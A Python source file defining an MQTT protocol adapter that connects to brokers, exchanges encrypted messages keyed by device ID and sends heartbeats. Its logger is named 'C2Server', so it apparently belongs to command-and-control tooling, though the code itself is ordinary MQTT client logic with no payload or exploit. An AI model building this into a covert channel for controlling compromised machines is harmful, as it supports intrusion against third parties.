import paho.mqtt.client as mqtt
import logging
from typing import Dict, Optional
from datetime import datetime
from protocol_adapter import ProtocolAdapter

class MQTTAdapter(ProtocolAdapter):
    def __init__(self, db, key, config):
        super().__init__(db, key, config)
        self.logger = logging.getLogger('C2Server')
        self.brokers = config['brokers']
        self.topics = config['topics']
        self.heartbeat_interval = config['heartbeat']['interval_seconds']
        self.timeout = config['heartbeat']['timeout_seconds']
        self.clients = {}

    def on_connect(self, client, userdata, flags, rc):
        if rc == 0:
            self.logger.info(f"Connected to MQTT broker")
            for topic in self.topics:
                client.subscribe(topic)
        else:
            self.logger.error(f"Failed to connect to MQTT broker: {rc}")

    def on_message(self, client, userdata, msg):
        try:
            # Decrypt message
            decrypted_data = self.decrypt_data(msg.payload)
            
            # Handle the message
            self.handle_message(decrypted_data)
        except Exception as e:
            self.logger.error(f"Error processing MQTT message: {str(e)}")

    def connect_broker(self, broker_config):
        client = mqtt.Client()
        client.on_connect = self.on_connect
        client.on_message = self.on_message
        
        if broker_config.get('tls', False):
            client.tls_set()
        
        try:
            client.connect(broker_config['host'], broker_config['port'])
            self.clients[broker_config['host']] = client
            return True
        except Exception as e:
            self.logger.error(f"Failed to connect to MQTT broker {broker_config['host']}: {str(e)}")
            return False

    def send_data(self, data: Dict, device_id: str) -> bool:
        try:
            # Encrypt data
            encrypted_data = self.encrypt_data(data)
            
            for broker in self.brokers:
                client = self.clients.get(broker['host'])
                if client:
                    for topic in self.topics:
                        client.publish(topic, encrypted_data, qos=broker.get('qos', 1), retain=broker.get('retain', False))
                        self.logger.info(f"Published MQTT message to {topic} for device {device_id}")
            
            return True
        except Exception as e:
            self.logger.error(f"Error sending MQTT data: {str(e)}")
            return False

    def receive_data(self, device_id: str) -> Optional[Dict]:
        # Data is received through the on_message callback
        return None

    def heartbeat(self, device_id: str) -> bool:
        try:
            for broker in self.brokers:
                client = self.clients.get(broker['host'])
                if client:
                    try:
                        client.publish("heartbeat", "alive", qos=1, retain=False)
                        self.logger.info(f"MQTT heartbeat successful for device {device_id}")
                        return True
                    except Exception as e:
                        self.logger.error(f"MQTT heartbeat failed: {str(e)}")
                        return False
            
            return False
        except Exception as e:
            self.logger.error(f"Heartbeat failed: {str(e)}")
            return False
